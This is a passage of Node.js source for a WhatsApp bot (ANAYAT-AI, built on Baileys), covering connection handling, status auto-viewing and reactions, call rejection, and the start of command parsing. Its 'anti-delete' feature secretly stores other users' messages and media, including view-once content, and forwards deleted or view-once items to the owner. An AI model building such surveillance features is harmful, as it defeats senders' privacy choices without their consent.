/**
 * ANAYAT-AI Bot - Ultra Fixed & Optimized
 * © 2025 ANAYAT-AI
 * ✅ Anti-Delete (All Media) | ✅ Auto Status View (100% Working) | ✅ Maximum Uptime
 */

const config = require('./config');
const axios = require('axios');
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers,
  delay,
  makeCacheableSignalKeyStore
} = require('@whiskeysockets/baileys');

const l = console.log;
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions');
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data');
const fs = require('fs');
const ff = require('fluent-ffmpeg');
const P = require('pino');
const GroupEvents = require('./lib/groupevents');
const qrcode = require('qrcode-terminal');
const StickersTypes = require('wa-sticker-formatter');
const util = require('util');
const { sms, downloadMediaMessage, AntiDelete } = require('./lib');
const FileType = require('file-type');
const { File } = require('megajs');
const { fromBuffer } = require('file-type');
const bodyparser = require('body-parser');
const os = require('os');
const Crypto = require('crypto');
const path = require('path');
const chalk = require('chalk');
const { rmSync } = require('fs');

// ==================== PERFORMANCE OPTIMIZATION ====================
if (process.env.NODE_OPTIONS !== '--max-old-space-size=4096') {
  process.env.NODE_OPTIONS = '--max-old-space-size=4096';
}
process.env.UV_THREADPOOL_SIZE = '128';

// ==================== CENTRALIZED LOGGING ====================
function log(message, color = 'white', isError = false) {
  const prefix = chalk.blue.bold('[ FAIZAN-MD⁸⁷³ ]');
  const logFunc = isError ? console.error : console.log;
  const coloredMessage = chalk[color](message);
  
  if (message.includes('\n') || message.includes('════')) {
    logFunc(prefix, coloredMessage);
  } else {
    logFunc(`${prefix} ${coloredMessage}`);
  }
}

// ==================== GLOBAL FLAGS ====================
global.isBotConnected = false;
global.errorRetryCount = 0;
global.messageCache = new Map();

// ==================== FILE PATHS ====================
const MESSAGE_STORE_FILE = path.join(__dirname, 'message_backup.json');
const SESSION_ERROR_FILE = path.join(__dirname, 'sessionErrorCount.json');
const ANTIDELETE_SETTINGS_FILE = path.join(__dirname, 'antidelete_settings.json');
const AUTOSTATUS_SETTINGS_FILE = path.join(__dirname, 'autostatus_settings.json');
const TEMP_MEDIA_DIR = path.join(__dirname, 'tmp_media');

// Create tmp media dir
if (!fs.existsSync(TEMP_MEDIA_DIR)) {
  fs.mkdirSync(TEMP_MEDIA_DIR, { recursive: true });
}

// ==================== ANTI-DELETE SYSTEM (ULTRA FIXED) ====================
const messageStore = new Map();

function loadAntiDeleteSettings() {
  try {
    if (fs.existsSync(ANTIDELETE_SETTINGS_FILE)) {
      const data = fs.readFileSync(ANTIDELETE_SETTINGS_FILE, 'utf-8');
      return JSON.parse(data);
    }
  } catch (error) {
    log(`Error loading anti-delete settings: ${error.message}`, 'red', true);
  }
  return { enabled: true }; // Default ON
}

function saveAntiDeleteSettings(settings) {
  try {
    fs.writeFileSync(ANTIDELETE_SETTINGS_FILE, JSON.stringify(settings, null, 2));
    return true;
  } catch (error) {
    log(`Error saving anti-delete settings: ${error.message}`, 'red', true);
    return false;
  }
}

global.antiDeleteSettings = loadAntiDeleteSettings();

// Store messages with media
async function storeMessageWithMedia(conn, message) {
  try {
    if (!global.antiDeleteSettings.enabled) return;
    if (!message.key?.id) return;

    const messageId = message.key.id;
    const sender = message.key.participant || message.key.remoteJid;
    const chatId = message.key.remoteJid;
    
    let content = '';
    let mediaType = '';
    let mediaPath = '';
    let mediaBuffer = null;

    // Handle view-once messages
    const viewOnceContainer = message.message?.viewOnceMessageV2?.message || 
                             message.message?.viewOnceMessage?.message;
    
    const actualMessage = viewOnceContainer || message.message;

    // Extract content and media
    if (actualMessage?.conversation) {
      content = actualMessage.conversation;
    } else if (actualMessage?.extendedTextMessage?.text) {
      content = actualMessage.extendedTextMessage.text;
    } else if (actualMessage?.imageMessage) {
      mediaType = 'image';
      content = actualMessage.imageMessage.caption || '';
      try {
        const stream = await downloadContentFromMessage(actualMessage.imageMessage, 'image');
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk]);
        }
        mediaBuffer = buffer;
        mediaPath = path.join(TEMP_MEDIA_DIR, `${messageId}.jpg`);
        fs.writeFileSync(mediaPath, buffer);
      } catch (e) {
        log(`Failed to download image: ${e.message}`, 'yellow');
      }
    } else if (actualMessage?.videoMessage) {
      mediaType = 'video';
      content = actualMessage.videoMessage.caption || '';
      try {
        const stream = await downloadContentFromMessage(actualMessage.videoMessage, 'video');
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk]);
        }
        mediaBuffer = buffer;
        mediaPath = path.join(TEMP_MEDIA_DIR, `${messageId}.mp4`);
        fs.writeFileSync(mediaPath, buffer);
      } catch (e) {
        log(`Failed to download video: ${e.message}`, 'yellow');
      }
    } else if (actualMessage?.audioMessage) {
      mediaType = actualMessage.audioMessage.ptt ? 'voice' : 'audio';
      try {
        const stream = await downloadContentFromMessage(actualMessage.audioMessage, 'audio');
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk]);
        }
        mediaBuffer = buffer;
        const ext = actualMessage.audioMessage.mimetype?.includes('ogg') ? 'ogg' : 'mp3';
        mediaPath = path.join(TEMP_MEDIA_DIR, `${messageId}.${ext}`);
        fs.writeFileSync(mediaPath, buffer);
      } catch (e) {
        log(`Failed to download audio: ${e.message}`, 'yellow');
      }
    } else if (actualMessage?.stickerMessage) {
      mediaType = 'sticker';
      try {
        const stream = await downloadContentFromMessage(actualMessage.stickerMessage, 'sticker');
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk]);
        }
        mediaBuffer = buffer;
        mediaPath = path.join(TEMP_MEDIA_DIR, `${messageId}.webp`);
        fs.writeFileSync(mediaPath, buffer);
      } catch (e) {
        log(`Failed to download sticker: ${e.message}`, 'yellow');
      }
    } else if (actualMessage?.documentMessage) {
      mediaType = 'document';
      content = actualMessage.documentMessage.caption || actualMessage.documentMessage.fileName || '';
      try {
        const stream = await downloadContentFromMessage(actualMessage.documentMessage, 'document');
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk]);
        }
        mediaBuffer = buffer;
        const fileName = actualMessage.documentMessage.fileName || `${messageId}.bin`;
        mediaPath = path.join(TEMP_MEDIA_DIR, fileName);
        fs.writeFileSync(mediaPath, buffer);
      } catch (e) {
        log(`Failed to download document: ${e.message}`, 'yellow');
      }
    }

    // Store in memory
    messageStore.set(messageId, {
      content,
      mediaType,
      mediaPath,
      mediaBuffer,
      sender,
      chatId,
      isGroup: chatId.endsWith('@g.us'),
      timestamp: new Date().toISOString(),
      isViewOnce: !!viewOnceContainer
    });

    // Auto-forward view-once to owner
    if (viewOnceContainer && mediaPath && fs.existsSync(mediaPath)) {
      try {
        const ownerJid = conn.user.id.split(':')[0] + '@s.whatsapp.net';
        const senderName = sender.split('@')[0];
        
        const caption = `*🔮 VIEW-ONCE DETECTED*\n\nFrom: @${senderName}\nType: ${mediaType}\n${content ? `\nCaption: ${content}` : ''}`;
        
        if (mediaType === 'image') {
          await conn.sendMessage(ownerJid, {
            image: { url: mediaPath },
            caption,
            mentions: [sender]
          });
        } else if (mediaType === 'video') {
          await conn.sendMessage(ownerJid, {
            video: { url: mediaPath },
            caption,
            mentions: [sender]
          });
        }
        
        log(`✅ View-once forwarded to owner`, 'green');
      } catch (e) {
        log(`Failed to forward view-once: ${e.message}`, 'yellow');
      }
    }

    // Cleanup old messages (keep last 100)
    if (messageStore.size > 100) {
      const firstKey = messageStore.keys().next().value;
      const firstMsg = messageStore.get(firstKey);
      if (firstMsg?.mediaPath && fs.existsSync(firstMsg.mediaPath)) {
        try {
          fs.unlinkSync(firstMsg.mediaPath);
        } catch (e) {
          // Ignore
        }
      }
      messageStore.delete(firstKey);
    }

  } catch (error) {
    log(`Store message error: ${error.message}`, 'red', true);
  }
}

// Handle deleted messages
async function handleDeletedMessage(conn, update) {
  try {
    if (!global.antiDeleteSettings.enabled) return;

    for (const item of update) {
      if (item.update.message === null) {
        const messageId = item.key.id;
        const deletedBy = item.key.participant || item.key.remoteJid;
        const ownerJid = conn.user.id.split(':')[0] + '@s.whatsapp.net';

        // Don't notify if owner deleted
        if (deletedBy === ownerJid || deletedBy.includes(conn.user.id.split(':')[0])) {
          continue;
        }

        const original = messageStore.get(messageId);
        if (!original) {
          log(`⚠️ Deleted message not found in store: ${messageId}`, 'yellow');
          continue;
        }

        log(`🗑️ Delete detected: ${messageId}`, 'yellow');

        const senderName = original.sender.split('@')[0];
        const deletedByName = deletedBy.split('@')[0];
        
        let groupName = 'Private Chat';
        if (original.isGroup) {
          try {
            const metadata = await conn.groupMetadata(original.chatId);
            groupName = metadata.subject || 'Unknown Group';
          } catch (e) {
            groupName = 'Unknown Group';
          }
        }

        const date = new Date(original.timestamp);
        const timeSent = date.toLocaleTimeString('en-US', {
          hour12: false,
          hour: '2-digit',
          minute: '2-digit'
        });
        const dateSent = date.toLocaleDateString('en-GB');

        // Send notification
        let text = `*🚨 𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙼𝙴𝚂𝚂𝙰𝙶𝙴! 🚨*
━━━━━━━━━━━━━━━━━━
𝙲𝙷𝙰𝚃: ${groupName}
𝚂𝙴𝙽𝚃 𝙱𝚈: @${senderName}
𝚃𝙸𝙼𝙴: ${timeSent}
𝙳𝙰𝚃𝙴: ${dateSent}
𝙳𝙴𝙻𝙴𝚃𝙴𝙳 𝙱𝚈: @${deletedByName}`;

        if (original.mediaType) {
          text += `\n𝚃𝚈𝙿𝙴: ${original.mediaType.toUpperCase()}`;
        }

        if (original.content) {
          text += `\n𝙼𝙴𝚂𝚂𝙰𝙶𝙴: ${original.content}`;
        }

        await conn.sendMessage(ownerJid, {
          text,
          mentions: [original.sender, deletedBy]
        });

        // Send media if available
        if (original.mediaPath && fs.existsSync(original.mediaPath)) {
          const mediaCaption = `🔮 𝙳𝙴𝙻𝙴𝚃𝙴𝙳 ${original.mediaType.toUpperCase()}\nFrom: @${senderName}\nDeleted by: @${deletedByName}`;
          
          try {
            if (original.mediaType === 'image') {
              await conn.sendMessage(ownerJid, {
                image: { url: original.mediaPath },
                caption: mediaCaption,
                mentions: [original.sender, deletedBy]
              });
            } else if (original.mediaType === 'video') {
              await conn.sendMessage(ownerJid, {
                video: { url: original.mediaPath },
                caption: mediaCaption,
                mentions: [original.sender, deletedBy]
              });
            } else if (original.mediaType === 'audio' || original.mediaType === 'voice') {
              await conn.sendMessage(ownerJid, {
                audio: { url: original.mediaPath },
                mimetype: 'audio/mpeg',
                ptt: original.mediaType === 'voice',
                caption: mediaCaption,
                mentions: [original.sender, deletedBy]
              });
            } else if (original.mediaType === 'sticker') {
              await conn.sendMessage(ownerJid, {
                sticker: { url: original.mediaPath }
              });
              await conn.sendMessage(ownerJid, {
                text: mediaCaption,
                mentions: [original.sender, deletedBy]
              });
            } else if (original.mediaType === 'document') {
              await conn.sendMessage(ownerJid, {
                document: { url: original.mediaPath },
                mimetype: 'application/octet-stream',
                fileName: path.basename(original.mediaPath),
                caption: mediaCaption,
                mentions: [original.sender, deletedBy]
              });
            }

            log(`✅ Anti-delete: Media sent to owner`, 'green');

            // Cleanup media file
            try {
              fs.unlinkSync(original.mediaPath);
            } catch (e) {
              // Ignore
            }
          } catch (e) {
            log(`Failed to send deleted media: ${e.message}`, 'red', true);
          }
        }

        // Remove from store
        messageStore.delete(messageId);
      }
    }
  } catch (error) {
    log(`Handle delete error: ${error.message}`, 'red', true);
  }
}

// ==================== AUTO STATUS SYSTEM (100% FIXED) ====================
function loadAutoStatusSettings() {
  try {
    if (fs.existsSync(AUTOSTATUS_SETTINGS_FILE)) {
      const data = fs.readFileSync(AUTOSTATUS_SETTINGS_FILE, 'utf-8');
      return JSON.parse(data);
    }
  } catch (error) {
    log(`Error loading auto status settings: ${error.message}`, 'red', true);
  }
  return { 
    viewEnabled: config.AUTO_STATUS_SEEN === "true",
    reactEnabled: config.AUTO_STATUS_REACT === "true",
    replyEnabled: config.AUTO_STATUS_REPLY === "true",
    customEmojis: ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡'],
    lastReactionTime: {},
    reactionInterval: 1,
    randomChance: 100
  };
}

function saveAutoStatusSettings(settings) {
  try {
    fs.writeFileSync(AUTOSTATUS_SETTINGS_FILE, JSON.stringify(settings, null, 2));
    return true;
  } catch (error) {
    log(`Error saving auto status settings: ${error.message}`, 'red', true);
    return false;
  }
}

global.autoStatusSettings = loadAutoStatusSettings();

function getRandomEmoji() {
  const emojis = global.autoStatusSettings.customEmojis || ['❤️', '🔥', '⭐', '👍', '💯'];
  return emojis[Math.floor(Math.random() * emojis.length)];
}

function canReactToStatus(userId) {
  try {
    const lastReactionTime = global.autoStatusSettings.lastReactionTime || {};
    const interval = global.autoStatusSettings.reactionInterval || 1;
    
    const lastTime = lastReactionTime[userId];
    if (!lastTime) return true;
    
    const timeDiff = Date.now() - lastTime;
    const minutesDiff = timeDiff / (1000 * 60);
    
    return minutesDiff >= interval;
  } catch (error) {
    return true;
  }
}

function updateReactionTime(userId) {
  try {
    global.autoStatusSettings.lastReactionTime = global.autoStatusSettings.lastReactionTime || {};
    global.autoStatusSettings.lastReactionTime[userId] = Date.now();
    saveAutoStatusSettings(global.autoStatusSettings);
  } catch (error) {
    // Ignore
  }
}

// ==================== ERROR COUNTER ====================
function loadErrorCount() {
  try {
    if (fs.existsSync(SESSION_ERROR_FILE)) {
      const data = fs.readFileSync(SESSION_ERROR_FILE, 'utf-8');
      return JSON.parse(data);
    }
  } catch (error) {
    log(`Error loading error count: ${error.message}`, 'red', true);
  }
  return { count: 0, last_error_timestamp: 0 };
}

function saveErrorCount(data) {
  try {
    fs.writeFileSync(SESSION_ERROR_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    log(`Error saving error count: ${error.message}`, 'red', true);
  }
}

function deleteErrorCountFile() {
  try {
    if (fs.existsSync(SESSION_ERROR_FILE)) {
      fs.unlinkSync(SESSION_ERROR_FILE);
      log('✅ Deleted sessionErrorCount.json', 'green');
    }
  } catch (e) {
    log(`Failed to delete error count: ${e.message}`, 'red', true);
  }
}

// ==================== CLEANUP FUNCTIONS ====================
function clearSessionFiles() {
  try {
    log('🔄 Clearing session files...', 'yellow');
    const sessionDir = path.join(__dirname, 'sessions');
    rmSync(sessionDir, { recursive: true, force: true });
    deleteErrorCountFile();
    global.errorRetryCount = 0;
    log('✅ Session files cleared successfully', 'green');
  } catch (e) {
    log(`Failed to clear session: ${e.message}`, 'red', true);
  }
}

function cleanupJunkFiles() {
  try {
    let directoryPath = __dirname;
    const junkExtensions = ['.gif', '.png', '.mp3', '.mp4', '.opus', '.jpg', '.webp', '.webm', '.zip'];
    
    fs.readdir(directoryPath, (err, files) => {
      if (err) return;
      
      const filteredArray = files.filter(item => 
        junkExtensions.some(ext => item.endsWith(ext))
      );
      
      if (filteredArray.length > 0) {
        let deleted = 0;
        filteredArray.forEach(file => {
          const filePath = path.join(directoryPath, file);
          try {
            if (fs.existsSync(filePath)) {
              fs.unlinkSync(filePath);
              deleted++;
            }
          } catch (e) {
            // Ignore
          }
        });
        if (deleted > 0) {
          log(`🗑️ Deleted ${deleted} junk files`, 'cyan');
        }
      }
    });
  } catch (error) {
    // Ignore
  }
}

function cleanupTempMedia() {
  try {
    if (!fs.existsSync(TEMP_MEDIA_DIR)) return;
    
    const files = fs.readdirSync(TEMP_MEDIA_DIR);
    const now = Date.now();
    let deleted = 0;
    
    files.forEach(file => {
      const filePath = path.join(TEMP_MEDIA_DIR, file);
      try {
        const stats = fs.statSync(filePath);
        const fileAge = now - stats.mtimeMs;
        
        // Delete files older than 1 hour
        if (fileAge > 60 * 60 * 1000) {
          fs.unlinkSync(filePath);
          deleted++;
        }
      } catch (e) {
        // Ignore
      }
    });
    
    if (deleted > 0) {
      log(`🗑️ Cleaned ${deleted} temp media files`, 'cyan');
    }
  } catch (error) {
    // Ignore
  }
}

// ==================== PREFIX & OWNER ====================
const prefix = config.PREFIX;
const ownerNumber = ['923452401207'];

// ==================== TEMP DIRECTORY ====================
const tempDir = path.join(os.tmpdir(), 'cache-temp');
if (!fs.existsSync(tempDir)) {
  fs.mkdirSync(tempDir, { recursive: true });
}

const clearTempDir = () => {
  try {
    fs.readdir(tempDir, (err, files) => {
      if (err) return;
      files.forEach(file => {
        try {
          fs.unlinkSync(path.join(tempDir, file));
        } catch (e) {
          // Ignore
        }
      });
    });
  } catch (error) {
    // Ignore
  }
};
setInterval(clearTempDir, 5 * 60 * 1000);

// ==================== SESSION AUTH ====================
const sessionDir = path.join(__dirname, 'sessions');
const credsPath = path.join(sessionDir, 'creds.json');

if (!fs.existsSync(sessionDir)) {
  fs.mkdirSync(sessionDir, { recursive: true });
}

if (!fs.existsSync(credsPath)) {
  if (config.SESSION_ID && config.SESSION_ID.trim() !== "") {
    const sessdata = config.SESSION_ID.replace("ANAYAT-AI~", '');
    try {
      const decodedData = Buffer.from(sessdata, 'base64').toString('utf-8');
      fs.writeFileSync(credsPath, decodedData);
      log("✅ Session loaded from SESSION_ID", 'green');
    } catch (err) {
      log("❌ Error decoding session data: " + err, 'red', true);
    }
  }
}

// ==================== ERROR HANDLER ====================
async function handle408Error(statusCode) {
  if (statusCode !== DisconnectReason.connectionTimeout) return false;
  
  global.errorRetryCount++;
  let errorState = loadErrorCount();
  const MAX_RETRIES = 5;
  
  errorState.count = global.errorRetryCount;
  errorState.last_error_timestamp = Date.now();
  saveErrorCount(errorState);

  log(`Connection Timeout (408). Retry: ${global.errorRetryCount}/${MAX_RETRIES}`, 'yellow');
  
  if (global.errorRetryCount >= MAX_RETRIES) {
    log(chalk.red.bgBlack('================================================='), 'white');
    log(chalk.white.bgRed(`🚨 MAX TIMEOUTS (${MAX_RETRIES}) REACHED`), 'white');
    log(chalk.red.bgBlack('================================================='), 'white');

    deleteErrorCountFile();
    global.errorRetryCount = 0;
    
    await delay(5000);
    process.exit(1);
  }
  return true;
}

// ==================== MAIN CONNECTION ====================
async function connectToWA() {
  log('[🔰] ANAYAT-AI Connecting to WhatsApp ⏳️...', 'cyan');
  
  global.errorRetryCount = loadErrorCount().count;
  
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version, isLatest } = await fetchLatestBaileysVersion();
  log(`Using WA v${version.join('.')}, isLatest: ${isLatest}`, 'cyan');
  
  const conn = makeWASocket({
    logger: P({ level: 'silent' }),
    printQRInTerminal: false,
    browser: Browsers.macOS("Firefox"),
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, P({ level: 'silent' }))
    },
    syncFullHistory: true,
    version,
    getMessage: async (key) => {
      if (global.messageCache.has(key.id)) {
        return global.messageCache.get(key.id);
      }
      return proto.Message.fromObject({});
    },
    generateHighQualityLinkPreview: false,
    markOnlineOnConnect: false,
    defaultQueryTimeoutMs: 20000,
    retryRequestDelayMs: 250,
    maxMsgRetryCount: 3,
    connectTimeoutMs: 30000,
    keepAliveIntervalMs: 20000,
    emitOwnEvents: false,
    fireInitQueries: true,
    qrTimeout: 45000,
    shouldIgnoreJid: jid => isJidBroadcast(jid),
    mobile: false,
    shouldSyncHistoryMessage: () => false,
    patchMessageBeforeSending: (message) => {
      const requiresPatch = !!(
        message.buttonsMessage ||
        message.templateMessage ||
        message.listMessage
      );
      if (requiresPatch) {
        message = {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadataVersion: 2,
                deviceListMetadata: {},
              },
              ...message,
            },
          },
        };
      }
      return message;
    }
  });

  conn.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;
    
    if (connection === 'close') {
      global.isBotConnected = false;
      
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      const reason = lastDisconnect?.error?.output?.payload?.message || 'Unknown';
      
      log(`[🔰] Connection closed: ${statusCode}, reconnecting: ${statusCode !== DisconnectReason.loggedOut}`, 'yellow');
      
      const permanentLogout = statusCode === DisconnectReason.loggedOut || statusCode === 401;
      
      if (permanentLogout) {
        log(chalk.bgRed.black(`\n🚨 LOGGED OUT! Status: ${statusCode}`), 'white');
        clearSessionFiles();
        log('✅ Session cleaned. Restarting in 5s...', 'green');
        await delay(5000);
        connectToWA();
      } else if (statusCode === DisconnectReason.badSession) {
        log('[❌] Bad Session File', 'red');
        rmSync(sessionDir, { recursive: true, force: true });
        setTimeout(connectToWA, 2000);
      } else if (statusCode === DisconnectReason.connectionClosed) {
        log('[⚠️] Connection closed, reconnecting...', 'yellow');
        setTimeout(connectToWA, 2000);
      } else if (statusCode === DisconnectReason.connectionLost) {
        log('[⚠️] Connection Lost, reconnecting...', 'yellow');
        setTimeout(connectToWA, 2000);
      } else if (statusCode === DisconnectReason.connectionReplaced) {
        log('[❌] Connection Replaced!', 'red');
        process.exit(0);
      } else if (statusCode === DisconnectReason.restartRequired) {
        log('[⚠️] Restart Required', 'yellow');
        setTimeout(connectToWA, 1500);
      } else if (statusCode === DisconnectReason.timedOut) {
        const is408Handled = await handle408Error(statusCode);
        if (is408Handled) return;
        log('[⚠️] TimedOut, Reconnecting...', 'yellow');
        setTimeout(connectToWA, 1500);
      } else {
        log(`[⚠️] Unknown Disconnect: ${statusCode}|${reason}`, 'yellow');
        setTimeout(connectToWA, 3000);
      }
    } else if (connection === 'open') {
      global.isBotConnected = true;
      
      log('🧬 Installing Plugins', 'cyan');
      const pluginPath = path.join(__dirname, 'plugins');
      if (fs.existsSync(pluginPath)) {
        fs.readdirSync(pluginPath).forEach((plugin) => {
          if (path.extname(plugin).toLowerCase() === ".js") {
            try {
              require(path.join(pluginPath, plugin));
            } catch (e) {
              log(`Error loading plugin ${plugin}: ${e}`, 'red', true);
            }
          }
        });
      }
      log('Plugins installed successful ✅', 'green');
      log('Bot connected to whatsapp ✅', 'green');
      
      log(`⚙️  Anti-Delete: ${global.antiDeleteSettings.enabled ? '✅ ON' : '❌ OFF'}`, global.antiDeleteSettings.enabled ? 'green' : 'red');
      log(`⚙️  Auto Status View: ${global.autoStatusSettings.viewEnabled ? '✅ ON' : '❌ OFF'}`, global.autoStatusSettings.viewEnabled ? 'green' : 'red');
      log(`⚙️  Auto Status React: ${global.autoStatusSettings.reactEnabled ? '✅ ON' : '❌ OFF'}`, global.autoStatusSettings.reactEnabled ? 'green' : 'red');
      
      let up = `*Hello there ANAYAT-AI User! 👋🏻* \n\n> Simple , Straight Forward But Loaded With Features 🎊, Meet ANAYAT-AI WhatsApp Bot.\n\n *Thanks for using ANAYAT-AI 🚩* \n\n> Join WhatsApp Channel :- ⤵️\n \nhttps://whatsapp.com/channel/0029VbAm8LqL2ATpxklIct2g \n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/ANAYAT-AI/ANAYAT-AI\n\n> © ᴘᴏᴡᴇʀᴇᴅ ʙʏ 𝙰𝙽𝙰𝚈𝙰𝚃-𝙰𝙸 ❣️ 🖤`;
      conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/0qvbob.jpg` }, caption: up });
      
      deleteErrorCountFile();
      global.errorRetryCount = 0;
    }
  });

  conn.ev.on('creds.update', saveCreds);

  // Suppress errors
  const originalConsoleError = console.error;
  console.error = (...args) => {
    const errorMsg = args.join(' ');
    if (errorMsg.includes('Bad MAC') || 
        errorMsg.includes('Failed to decrypt') || 
        errorMsg.includes('Session error') ||
        errorMsg.includes('Closing session')) {
      return;
    }
    originalConsoleError.apply(console, args);
  };

  // ================== MESSAGE LOGGER & ANTI-DELETE ==================
  conn.ev.on('messages.upsert', async chatUpdate => {
    try {
      for (const msg of chatUpdate.messages) {
        if (!msg.message) continue;
        
        // Store for anti-delete
        await storeMessageWithMedia(conn, msg);
        
        let messageId = msg.key.id;
        global.messageCache.set(messageId, msg.message);
        
        if (global.messageCache.size > 500) {
          const firstKey = global.messageCache.keys().next().value;
          global.messageCache.delete(firstKey);
        }
      }
    } catch (error) {
      // Ignore
    }
  });

  // ================== ANTI-DELETE HANDLER ==================
  conn.ev.on('messages.update', async updates => {
    for (const update of updates) {
      if (update.update.message === null) {
        await handleDeletedMessage(conn, updates);
      }
    }
  });

  // ================== ANTI-CALL ==================
  conn.ev.on("call", async (json) => {
    try {
      if (config.ANTI_CALL !== 'true') return;

      for (const call of json) {
        if (call.status !== 'offer') continue;

        const id = call.id;
        const from = call.from;

        await conn.rejectCall(id, from);
        await conn.sendMessage(from, {
          text: config.REJECT_MSG || '*📞 ᴄαℓℓ ɴσт αℓℓσωє∂ ιɴ тнιѕ ɴᴜмвєʀ уσυ ∂σɴт нανє ᴘєʀмιѕѕισɴ 📵*'
        });
        log(`Call rejected: ${from}`, 'cyan');
      }
    } catch (err) {
      log("Anti-call error: " + err, 'red', true);
    }
  });

  // ================== GROUP EVENTS ==================
  conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));

  // ================== MESSAGE HANDLER ==================
  conn.ev.on('messages.upsert', async(mek) => {
    try {
      mek = mek.messages[0];
      if (!mek.message) return;
      if (mek.messageStubType) return;
      
      mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
        ? mek.message.ephemeralMessage.message 
        : mek.message;

      // ================== AUTO STATUS HANDLER (100% FIXED) ==================
      if (mek.key && mek.key.remoteJid === 'status@broadcast') {
        const statusUser = mek.key.participant || mek.key.remoteJid;
        const statusUserId = statusUser.split('@')[0];
        
        log(`📱 Status from: ${statusUserId}`, 'cyan');
        
        // AUTO STATUS VIEW
        if (global.autoStatusSettings.viewEnabled) {
          try {
            await Promise.allSettled([
              conn.readMessages([mek.key]),
              conn.chatModify({ 
                markRead: true, 
                lastMessages: [{ 
                  key: mek.key, 
                  messageTimestamp: mek.messageTimestamp || Math.floor(Date.now() / 1000)
                }] 
              }, statusUser)
            ]);
            
            log(`✅ Status viewed: ${statusUserId}`, 'green');
          } catch (error) {
            log(`⚠️ Status view error: ${error.message}`, 'yellow');
          }
        }
        
        // AUTO STATUS REACT
        if (global.autoStatusSettings.reactEnabled && canReactToStatus(statusUserId)) {
          setTimeout(async () => {
            try {
              const randomChance = global.autoStatusSettings.randomChance || 100;
              const shouldReact = Math.random() * 100 <= randomChance;
              
              if (shouldReact) {
                const emoji = getRandomEmoji();
                
                await conn.sendMessage('status@broadcast', {
                  react: {
                    text: emoji,
                    key: mek.key
                  }
                }, {
                  statusJidList: [statusUser]
                });
                
                updateReactionTime(statusUserId);
                log(`✅ Status reacted: ${statusUserId} with ${emoji}`, 'green');
              }
            } catch (error) {
              log(`⚠️ Status react error: ${error.message}`, 'yellow');
            }
          }, 1500);
        }
        
        // AUTO STATUS REPLY
        if (global.autoStatusSettings.replyEnabled) {
          setTimeout(async () => {
            try {
              const replyText = config.AUTO_STATUS_MSG || 'Nice status! 💜';
              await conn.sendMessage(statusUser, { text: replyText, react: { text: '💜', key: mek.key } }, { quoted: mek });
              log(`✅ Status replied: ${statusUserId}`, 'green');
            } catch (error) {
              log(`⚠️ Status reply error: ${error.message}`, 'yellow');
            }
          }, 2500);
        }
        
        return;
      }

      // READ MESSAGE
      if (config.READ_MESSAGE === 'true') {
        await conn.readMessages([mek.key]);
      }

      // VIEW ONCE
      if(mek.message.viewOnceMessageV2) {
        mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message;
      }

      // NEWSLETTER REACT
      const newsletterJids = [
        "120363420933039839@newsletter",
        "120363420933039839@newsletter"
      ];
      const emojis = ["❤️", "💚", "🤍", "🩵", "🩷", "🪷", "🪸", "🍷", "🍬", "🌎", "🍨", "🌸", "🪄"];

      if (mek.key && newsletterJids.includes(mek.key.remoteJid)) {
        try {
          const serverId = mek.newsletterServerId;
          if (serverId) {
            const emoji = emojis[Math.floor(Math.random() * emojis.length)];
            await conn.newsletterReactMessage(mek.key.remoteJid, serverId.toString(), emoji);
          }
        } catch (e) {
          // Ignore
        }
      }

      await Promise.all([saveMessage(mek)]);

      const m = sms(conn, mek);
      const type = getContentType(mek.message);
      const content = JSON.stringify(mek.message);
      const from = mek.key.remoteJid;
      const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
      const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : '';
      const isCmd = body.startsWith(prefix);
      var budy = typeof mek.text == 'string' ? mek.text : false;
      const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
      const args = body.trim().split(/ +/).slice(1);
      const q = args.join(' ');
      const text = args.join(' ');
      const isGroup = from.endsWith('@g.us');
